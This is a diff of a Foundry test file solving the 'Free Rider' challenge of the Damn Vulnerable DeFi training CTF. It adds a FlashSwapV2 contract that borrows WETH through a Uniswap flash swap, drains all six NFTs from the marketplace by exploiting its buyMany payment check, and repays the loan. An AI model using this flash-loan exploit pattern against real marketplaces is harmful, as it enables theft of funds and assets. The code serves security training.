@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -135,6 +136,19 @@ contract FreeRider is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker, attacker);
+        FlashSwapV2 flash = new FlashSwapV2(
+            uniswapV2Pair,
+            freeRiderNFTMarketplace,
+            6,
+            15 * 10**18
+        );
+        flash.exploit();
+        for (uint8 tId = 0; tId < 6;) {
+            damnValuableNFT.transferFrom(attacker, buyer, tId);
+            unchecked {
+                ++tId;
+            }
+        }
 
         vm.stopPrank();
         /**
@@ -165,4 +179,73 @@ contract FreeRider is Test {
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
         assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
     }
+}
+
+contract FlashSwapV2 {
+    IUniswapV2Pair pair;
+    FreeRiderNFTMarketplace marketplace;
+    address owner;
+    uint8 numberOfNFT;
+    uint256 nftPrice;
+
+    constructor(IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace, uint8 _numberOfNFT, uint256 _nftPrice) {
+        owner = msg.sender;
+        pair = _pair;
+        marketplace = _marketplace;
+        numberOfNFT = _numberOfNFT;
+        nftPrice = _nftPrice;
+    }
+
+    function exploit() external {
+        // need to pass some data to trigger uniswapV2Call
+        // borrow 15 ether of WETH
+        bytes memory data = abi.encode(pair.token1(), nftPrice);
+
+        pair.swap(nftPrice, 0, address(this), data);
+    }
+
+    // called by pair contract
+    function uniswapV2Call(address _sender, uint256, uint256, bytes calldata _data) external {
+        require(msg.sender == address(pair), "!pair");
+        require(_sender == address(this), "!sender");
+
+        (address payable tokenBorrow, uint256 amount) = abi.decode(_data, (address, uint256));
+
+        console.log("token %s", tokenBorrow);
+        console.log("amount %d", amount);
+
+        // about 0.3%
+        uint256 fee = ((amount * 3) / 997) + 1;
+        uint256 amountToRepay = amount + fee;
+
+        // unwrap WETH
+        WETH9 weth = WETH9(tokenBorrow);
+        weth.withdraw(amount);
+        //IERC20(tokenBorrow).withdraw(amount);
+
+        // buy tokens from the marketplace
+        uint256[] memory tokenIds = new uint256[](numberOfNFT);
+        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
+            tokenIds[tokenId] = tokenId;
+        }
+        marketplace.buyMany{value: nftPrice}(tokenIds);
+        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());
+
+        // send all of them to the buyer
+        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
+            tokenIds[tokenId] = tokenId;
+            nft.safeTransferFrom(address(this), owner, tokenId);
+        }
+
+        // wrap enough WETH9 to repay our debt
+        weth.deposit{value: amountToRepay}();
+
+        // repay the debt
+        weth.transfer(address(pair), amountToRepay);
+
+        // selfdestruct to the owner
+        selfdestruct(payable(owner));
+    }
+
+    receive() external payable {}
 }
